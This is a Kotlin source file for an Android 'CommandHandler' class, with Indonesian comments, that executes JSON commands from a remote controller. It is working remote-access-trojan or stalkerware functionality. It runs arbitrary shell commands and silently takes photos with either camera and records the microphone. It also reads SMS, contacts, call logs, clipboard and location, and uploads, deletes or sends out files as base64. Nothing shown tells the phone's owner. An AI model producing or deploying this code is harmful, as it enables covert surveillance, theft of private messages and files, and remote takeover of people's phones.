package com.example.devicecontrol

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONArray
import android.os.Handler
import android.os.Looper
import android.media.AudioManager
import android.hardware.camera2.CameraManager
import android.speech.tts.TextToSpeech
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.hardware.SensorManager
import android.hardware.Sensor
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.ClipboardManager
import android.content.ClipData
import java.util.Locale
import android.location.LocationManager
import android.net.Uri
import java.net.Inet4Address
import java.net.Inet6Address
import java.net.NetworkInterface
import java.util.*
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.net.wifi.WifiManager
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.graphics.ImageFormat
import android.os.HandlerThread

import android.os.Vibrator
import android.os.VibratorManager
import android.os.VibrationEffect
import android.media.RingtoneManager
import android.provider.CallLog
import android.app.WallpaperManager
import android.content.Intent
import android.content.pm.ApplicationInfo
import java.net.URL
import android.app.admin.DevicePolicyManager
import android.os.PowerManager
import android.graphics.BitmapFactory

class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {

    private var tts: TextToSpeech? = null
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    private var isTorchOn = false

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale("id", "ID")
        }
    }

    private fun checkPerm(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
    }

    fun handle(jsonStr: String, sendResponse: (String) -> Unit): String? {
        var cmdId = ""
        try {
            val json = JSONObject(jsonStr)
            var command = json.getString("command").trim()
            var textArg = json.optString("text", "")
            cmdId = json.optString("id", "")

            if (command.contains(" ")) {
                val parts = command.split(" ", limit = 2)
                command = parts[0]
                if (textArg.isEmpty()) textArg = parts[1]
            }

            when (command) {
                "ping" -> {
                    val resp = createResponse(cmdId, "pong", "Alive")
                    sendResponse(resp)
                    return resp
                }
                "get_device_info" -> {
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("brand", Build.BRAND)
                        put("sdk", Build.VERSION.SDK_INT)
                        put("release", Build.VERSION.RELEASE)
                        
                        val ips = getIPs()
                        put("ipv4", ips.first)
                        put("ipv6", ips.second)
                    }
                    val resp = createResponse(cmdId, "device_info", info)
                    sendResponse(resp)
                    return resp
                }
                "get_battery" -> {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    val resp = createResponse(cmdId, "battery_level", level)
                    sendResponse(resp)
                    return resp
                }
                "show_toast" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                    }
                    val resp = createResponse(cmdId, "toast", "Displayed: $textArg")
                    sendResponse(resp)
                    return resp
                }
                "device_lock", "lock_screen" -> {
                    try {
                        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        val compName = android.content.ComponentName(context, DeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(compName)) {
                            dpm.lockNow()
                            val resp = createResponse(cmdId, "success", "Screen locked")
                            sendResponse(resp); return resp
                        } else {
                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk mengunci layar secara remote.")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                            val resp = createResponse(cmdId, "info", "Aktivasi Device Admin diperlukan di perangkat.")
                            sendResponse(resp); return resp
                        }
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Lock failed: ${e.message}")
                        sendResponse(resp); return resp
                    }
                }
                "device_wake", "screen_on" -> {
                    try {
                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                        @Suppress("DEPRECATION")
                        val wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                            PowerManager.ACQUIRE_CAUSES_WAKEUP or
                            PowerManager.ON_AFTER_RELEASE,
                            "rac-js:wakeup"
                        )
                        wl.acquire(5000L) // Hidupkan selama 5 detik
                        val resp = createResponse(cmdId, "success", "Screen woken up")
                        sendResponse(resp); return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Wake failed: ${e.message}")
                        sendResponse(resp); return resp
                    }
                }
                "vibrate" -> {
                    try {
                        val durationMs = (textArg.toFloatOrNull() ?: 1f) * 1000L
                        val effect = VibrationEffect.createOneShot(durationMs.toLong(), VibrationEffect.DEFAULT_AMPLITUDE)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                            vm.defaultVibrator.vibrate(effect)
                        } else {
                            @Suppress("DEPRECATION")
                            val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                            vib.vibrate(effect)
                        }
                        val resp = createResponse(cmdId, "success", "Vibrating ${durationMs.toLong()}ms")
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Vibrate failed: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "shell" -> {
                    try {
                        val fullCmd = textArg.ifEmpty { "ls" }
                        val process = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-c", fullCmd))
                        val reader = BufferedReader(InputStreamReader(process.inputStream))
                        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                        val output = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) output.append(line).append("\n")
                        while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                        process.waitFor()
                        val resp = createResponse(cmdId, "shell_output", output.toString())
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Shell failed: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "get_volume", "volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val volInfo = JSONObject().apply {
                        put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                        put("ring_max", am.getStreamMaxVolume(AudioManager.STREAM_RING))
                        put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                        put("music_max", am.getStreamMaxVolume(AudioManager.STREAM_MUSIC))
                        put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                        put("alarm_max", am.getStreamMaxVolume(AudioManager.STREAM_ALARM))
                        put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                        put("voice_max", am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL))
                        put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                        put("notification_max", am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION))
                    }
                    val resp = createResponse(cmdId, "volume_info", volInfo)
                    sendResponse(resp)
                    return resp
                }
                "set_volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    if (textArg.lowercase() == "get") {
                        val volInfo = JSONObject().apply {
                            put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                            put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                            put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                            put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                            put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                        }
                        val resp = createResponse(cmdId, "volume_info", volInfo)
                        sendResponse(resp)
                        return resp
                    } else {
                        val parts = textArg.trim().split(Regex("\\s+"))
                        if (parts.size >= 2) {
                            try {
                                val type = parts[0].lowercase()
                                val vol = parts[1].toIntOrNull() ?: 0
                                val stream = when (type) {
                                    "music", "media" -> AudioManager.STREAM_MUSIC
                                    "ring" -> AudioManager.STREAM_RING
                                    "alarm" -> AudioManager.STREAM_ALARM
                                    "notification" -> AudioManager.STREAM_NOTIFICATION
                                    "voice", "call" -> AudioManager.STREAM_VOICE_CALL
                                    else -> AudioManager.STREAM_MUSIC
                                }
                                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                                val max = am.getStreamMaxVolume(stream)
                                val min = if (Build.VERSION.SDK_INT >= 28) am.getStreamMinVolume(stream) else 0
                                val finalVol = if (vol > max) max else if (vol < min) min else vol
                                
                                // Khusus Android 12+: Kadang butuh audio focus agar perubahan volume "menempel"
                                if (Build.VERSION.SDK_INT >= 31) {
                                    try {
                                        val audioAttributes = android.media.AudioAttributes.Builder()
                                            .setUsage(android.media.AudioAttributes.USAGE_MEDIA)
                                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_MUSIC)
                                            .build()
                                        val focusRequest = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                                            .setAudioAttributes(audioAttributes)
                                            .build()
                                        am.requestAudioFocus(focusRequest)
                                    } catch (e: Exception) {}
                                }

                                if (Build.VERSION.SDK_INT >= 31 && am.isStreamMute(stream)) {
                                    am.adjustStreamVolume(stream, AudioManager.ADJUST_UNMUTE, 0)
                                }

                                // Coba set volume
                                am.setStreamVolume(stream, finalVol, 7)
                                
                                // Berikan jeda 150ms agar sistem Android 12 selesai memproses perubahan
                                Thread.sleep(150)
                                
                                var currentVol = am.getStreamVolume(stream)
                                
                                // Fallback jika masih gagal (biasanya butuh adjust manual)
                                if (currentVol != finalVol) {
                                    am.setStreamVolume(stream, finalVol, 1) // Coba flag minimal
                                    Thread.sleep(100)
                                    currentVol = am.getStreamVolume(stream)
                                }
                                
                                var statusMsg = if (currentVol == finalVol) "Volume $type set to $finalVol" 
                                               else "Volume $type requested $finalVol but system set it to $currentVol"
                                
                                if (currentVol != finalVol && am.isStreamMute(stream)) {
                                    statusMsg += " (Muted)"
                                }

                                val resp = createResponse(cmdId, "success", "$statusMsg (Range: $min-$max)")
                                sendResponse(resp)
                                return resp
                            } catch (e: Exception) {
                                val resp = createResponse(cmdId, "error", "Gagal: ${e.message}")
                                sendResponse(resp)
                                return resp
                            }
                        }
                    }
                }
                "torch" -> {
                    try {
                        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = camManager.cameraIdList[0] 
                        val state = if (textArg.lowercase() == "on") true else if (textArg.lowercase() == "off") false else !isTorchOn
                        camManager.setTorchMode(cameraId, state)
                        isTorchOn = state
                        val resp = createResponse(cmdId, "success", "Torch $state")
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Torch err: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "tts" -> {
                    tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                    val resp = createResponse(cmdId, "success", "Speaking...")
                    sendResponse(resp)
                    return resp
                }
                "notify" -> {
                    val parts = textArg.split("|")
                    val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                    val content = if (parts.size > 1) parts[1] else "Message"
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val channel = NotificationChannel("remote_notify", "Remote Messages", NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    val notification = NotificationCompat.Builder(context, "remote_notify")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle(title)
                        .setContentText(content)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                    notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                    val resp = createResponse(cmdId, "success", "Pushed")
                    sendResponse(resp)
                    return resp
                }
                "sensors" -> {
                    val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                    val list = sm.getSensorList(Sensor.TYPE_ALL)
                    val result = JSONArray()
                    for (s in list) { result.put(JSONObject().apply { put("name", s.name); put("type", s.type) }) }
                    val resp = createResponse(cmdId, "sensor_list", result)
                    sendResponse(resp)
                    return resp
                }
                "clipboard" -> {
                    val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val txt = if (cm.hasPrimaryClip()) cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "" else ""
                    val resp = createResponse(cmdId, "clipboard", txt)
                    sendResponse(resp)
                    return resp
                }
                "upload" -> {
                    try {
                        val parts = textArg.split("^^^")
                        if (parts.size == 2) {
                            val path = parts[0]
                            val data = android.util.Base64.decode(parts[1], android.util.Base64.DEFAULT)
                            java.io.File(path).writeBytes(data)
                            val resp = createResponse(cmdId, "success", "Berhasil diunggah: ${java.io.File(path).name}")
                            sendResponse(resp)
                            return resp
                        } else {
                            val resp = createResponse(cmdId, "error", "Payload upload tidak valid")
                            sendResponse(resp)
                            return resp
                        }
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Gagal upload: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "ls" -> {
                    try {
                        val path = if (textArg.isEmpty()) "/storage/emulated/0" else textArg
                        val dir = java.io.File(path)
                        val arr = JSONArray()
                        if (dir.exists() && dir.isDirectory) {
                            val files = dir.listFiles()?.toList() ?: emptyList()
                            val sorted = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                            sorted.forEach {
                                arr.put(JSONObject().apply {
                                    put("name", it.name); put("is_dir", it.isDirectory)
                                    put("path", it.absolutePath); put("size", it.length())
                                })
                            }
                            val resp = createResponse(cmdId, "ls_result", arr)
                            sendResponse(resp)
                            return resp
                        }
                    } catch (e: Exception) {}
                }
                "photo" -> {
                    try {
                        val result = capturePhotoBlocking(textArg.lowercase() == "front")
                        val resp = createResponse(cmdId, "photo_result", result)
                        sendResponse(resp)
                        return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Photo failed: ${e.message}")
                        sendResponse(resp)
                        return resp
                    }
                }
                "call_logs" -> {
                    if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
                        val res = JSONArray()
                        val cursor = context.contentResolver.query(
                            CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC"
                        )
                        cursor?.use {
                            val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                            val numIdx  = it.getColumnIndex(CallLog.Calls.NUMBER)
                            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                            val durIdx  = it.getColumnIndex(CallLog.Calls.DURATION)
                            val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                            while (it.moveToNext() && res.length() < 50) {
                                val callType = when (it.getInt(typeIdx)) {
                                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                    CallLog.Calls.MISSED_TYPE   -> "missed"
                                    else -> "unknown"
                                }
                                res.put(JSONObject().apply {
                                    put("name", it.getString(nameIdx) ?: "Unknown")
                                    put("number", it.getString(numIdx) ?: "")
                                    put("type", callType)
                                    put("duration", formatDuration(it.getLong(durIdx)))
                                    put("date", it.getLong(dateIdx))
                                })
                            }
                        }
                        val resp = createResponse(cmdId, "call_logs", res)
                        sendResponse(resp); return resp
                    } else {
                        val resp = createResponse(cmdId, "error", "Izin READ_CALL_LOG tidak diberikan")
                        sendResponse(resp); return resp
                    }
                }
                "app_list" -> {
                    val pm = context.packageManager
                    val showAll = textArg.lowercase() == "all"
                    val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                    val res = JSONArray()
                    apps.filter { showAll || (it.flags and ApplicationInfo.FLAG_SYSTEM == 0) }
                        .sortedBy { pm.getApplicationLabel(it).toString() }
                        .forEach {
                            res.put(JSONObject().apply {
                                put("name", pm.getApplicationLabel(it).toString())
                                put("package", it.packageName)
                            })
                        }
                    val resp = createResponse(cmdId, "app_list", res)
                    sendResponse(resp); return resp
                }
                "launch_app" -> {
                    try {
                        val intent = context.packageManager.getLaunchIntentForPackage(textArg)
                        if (intent != null) {
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(intent)
                            val resp = createResponse(cmdId, "success", "Membuka $textArg")
                            sendResponse(resp); return resp
                        } else {
                            val resp = createResponse(cmdId, "error", "App tidak ditemukan: $textArg")
                            sendResponse(resp); return resp
                        }
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Launch failed: ${e.message}")
                        sendResponse(resp); return resp
                    }
                }
                "uninstall_app" -> {
                    try {
                        val intent = Intent(Intent.ACTION_DELETE).apply {
                            data = Uri.parse("package:$textArg")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                        val resp = createResponse(cmdId, "success", "Dialog uninstall dibuka untuk $textArg")
                        sendResponse(resp); return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Uninstall failed: ${e.message}")
                        sendResponse(resp); return resp
                    }
                }
                "play_sound" -> {
                    try {
                        val mp = android.media.MediaPlayer()
                        mp.setDataSource(textArg)
                        mp.prepare()
                        mp.start()
                        mp.setOnCompletionListener { it.release() }
                        val resp = createResponse(cmdId, "success", "Memutar: $textArg")
                        sendResponse(resp); return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", "Putar gagal: ${e.message}")
                        sendResponse(resp); return resp
                    }
                }
                "contacts" -> {
                    if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                        val res = JSONArray()
                        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                        cursor?.use {
                            while (it.moveToNext() && res.length() < 100) {
                                res.put(JSONObject().apply {
                                    put("name", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                                    put("number", it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                                })
                            }
                        }
                        val resp = createResponse(cmdId, "contacts_list", res)
                        sendResponse(resp); return resp
                    }
                }
                "sms_list" -> {
                    if (checkPerm(Manifest.permission.READ_SMS)) {
                        val res = JSONArray()
                        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                        cursor?.use {
                            while (it.moveToNext() && res.length() < 50) {
                                res.put(JSONObject().apply {
                                    put("from", it.getString(it.getColumnIndex("address")))
                                    put("body", it.getString(it.getColumnIndex("body")).take(200))
                                })
                            }
                        }
                        val resp = createResponse(cmdId, "sms_inbox", res)
                        sendResponse(resp); return resp
                    }
                }
                "wifi_scan" -> {
                    val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val res = JSONArray()
                    wm.scanResults.forEach { ap ->
                        res.put(JSONObject().apply {
                            put("ssid", ap.SSID.ifEmpty { "(Hidden)" })
                            put("level", ap.level)
                            put("signal", "${ap.level} dBm")
                        })
                    }
                    val resp = createResponse(cmdId, "wifi_networks", res)
                    sendResponse(resp); return resp
                }
                "location" -> {
                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (loc != null) {
                            val obj = JSONObject().apply {
                                put("lat", loc.latitude); put("lon", loc.longitude)
                                put("accuracy", loc.accuracy)
                                put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
                            }
                            val resp = createResponse(cmdId, "location_data", obj)
                            sendResponse(resp); return resp
                        } else {
                            val resp = createResponse(cmdId, "error", "Location tidak tersedia")
                            sendResponse(resp); return resp
                        }
                    }
                }
                "find" -> {
                    val p = textArg.split("|")
                    val root = java.io.File(if (p.isNotEmpty()) p[0] else "/sdcard")
                    val query = if (p.size > 1) p[1].lowercase() else ""
                    val res = JSONArray()
                    fun walk(d: java.io.File, depth: Int) {
                        if (depth > 5) return
                        d.listFiles()?.forEach {
                            if (it.isDirectory) walk(it, depth + 1)
                            else if (query.isEmpty() || it.name.lowercase().contains(query)) {
                                res.put(JSONObject().apply {
                                    put("name", it.name); put("path", it.absolutePath)
                                    put("is_dir", false); put("size", it.length())
                                })
                            }
                            if (res.length() > 500) return@forEach
                        }
                    }
                    if (root.exists()) walk(root, 0)
                    val resp = createResponse(cmdId, "find_result", res)
                    sendResponse(resp); return resp
                }
                "record_sound" -> {
                    try {
                        val duration = textArg.toLongOrNull() ?: 5L
                        val file = java.io.File(context.cacheDir, "record.mp4")
                        val mr = android.media.MediaRecorder()
                        mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                        mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                        mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                        mr.setOutputFile(file.absolutePath)
                        mr.prepare(); mr.start()
                        Thread.sleep(duration * 1000)
                        mr.stop(); mr.release()
                        val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
                        val resp = createResponse(cmdId, "audio_base64", b64)
                        sendResponse(resp); return resp
                    } catch (e: Exception) {
                        val resp = createResponse(cmdId, "error", e.message ?: "Record failed")
                        sendResponse(resp); return resp
                    }
                }
            }

            // Async-only: long running tasks yang tidak perlu return langsung ke HTTP
            when (command) {
                "rm" -> {
                    val f = java.io.File(textArg)
                    if (f.exists()) {
                        val del = if (f.isDirectory) f.deleteRecursively() else f.delete()
                        sendResponse(createResponse(cmdId, if (del) "success" else "error", "RM: $textArg"))
                    }
                }
                "mv" -> {
                    val p = textArg.split("|")
                    if (p.size == 2 && java.io.File(p[0]).renameTo(java.io.File(p[1])))
                        sendResponse(createResponse(cmdId, "success", "Moved"))
                }
                "download" -> {
                    Thread {
                        val f = java.io.File(textArg)
                        if (f.exists()) {
                            val b64 = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.DEFAULT)
                            sendResponse(createResponse(cmdId, "file_download", JSONObject().apply { put("name", f.name); put("data", b64) }))
                        }
                    }.start()
                }
            }
        } catch (e: Exception) {
            val resp = createResponse(cmdId, "error", e.message ?: "Err")
            sendResponse(resp); return resp
        }
        return null
    }

    private fun getIPs(): Pair<String?, String?> {
        var ipv4: String? = null
        var ipv6: String? = null
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()?.toList() ?: emptyList()
            for (iface in interfaces) {
                if (!iface.isUp || iface.isLoopback) continue
                for (addr in iface.inetAddresses) {
                    if (!addr.isLoopbackAddress) {
                        if (addr is Inet4Address) {
                            ipv4 = addr.hostAddress
                        } else if (addr is Inet6Address) {
                            val sAddr = addr.hostAddress.replace("%.*".toRegex(), "").uppercase()
                            if (!addr.isLinkLocalAddress && (sAddr.startsWith("2") || sAddr.startsWith("3"))) {
                                ipv6 = sAddr
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {}
        return Pair(ipv4, ipv6)
    }

    private fun createResponse(cmdId: String, type: String, data: Any): String {
        return JSONObject().apply {
            if (cmdId.isNotEmpty()) put("id", cmdId)
            put("type", type); put("data", data); put("timestamp", System.currentTimeMillis())
        }.toString()
    }

    private fun capturePhotoBlocking(useFront: Boolean): JSONObject {
        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = camManager.cameraIdList.firstOrNull { id ->
            val facing = camManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
            if (useFront) facing == CameraCharacteristics.LENS_FACING_FRONT
            else facing == CameraCharacteristics.LENS_FACING_BACK
        } ?: camManager.cameraIdList.first()

        val imageCapture = java.util.concurrent.CompletableFuture<ByteArray>()
        val handlerThread = HandlerThread("cam_sync_${System.currentTimeMillis()}").apply { start() }
        val camHandler = Handler(handlerThread.looper)
        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
        var cameraDevice: CameraDevice? = null

        imageReader.setOnImageAvailableListener({ reader ->
            try {
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining()).also { buffer.get(it) }
                image.close()
                if (!imageCapture.isDone) imageCapture.complete(bytes)
            } catch (e: Exception) {
                if (!imageCapture.isDone) imageCapture.completeExceptionally(e)
            }
        }, camHandler)

        camManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            val characteristics = camManager.getCameraCharacteristics(cameraId)
                            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                            val jpegOrientation = sensorOrientation

                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(imageReader.surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
                            }.build()
                            // Beri waktu sedikit untuk AE sebelum capture
                            camHandler.postDelayed({ 
                                try {
                                    session.capture(req, null, camHandler)
                                } catch (e: Exception) {
                                    if (!imageCapture.isDone) imageCapture.completeExceptionally(e)
                                }
                            }, 600)
                        } catch (e: Exception) {
                            if (!imageCapture.isDone) imageCapture.completeExceptionally(e)
                        }
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Session config failed"))
                    }
                }, camHandler)
            }
            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
                if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Camera disconnected"))
            }
            override fun onError(camera: CameraDevice, error: Int) {
                camera.close()
                if (!imageCapture.isDone) imageCapture.completeExceptionally(Exception("Camera error: $error"))
            }
        }, camHandler)

        return try {
            val bytes = imageCapture.get(10, java.util.concurrent.TimeUnit.SECONDS)
            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
            JSONObject().apply {
                put("facing", if (useFront) "front" else "back")
                put("jpeg_base64", b64)
            }
        } finally {
            try { cameraDevice?.close() } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            handlerThread.quitSafely()
        }
    }

    private fun formatDuration(seconds: Long): String {
        val m = seconds / 60
        val s = seconds % 60
        return if (m > 0) "${m}m ${s}s" else "${s}s"
    }
}
